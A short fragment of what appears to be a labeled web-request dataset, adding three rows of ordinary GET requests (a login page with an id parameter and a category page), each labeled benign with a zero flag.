+benign,,GET /login?id=10,,0
+benign,,GET /?category=electronics,,0
+benign,,GET /login?id=10,,0
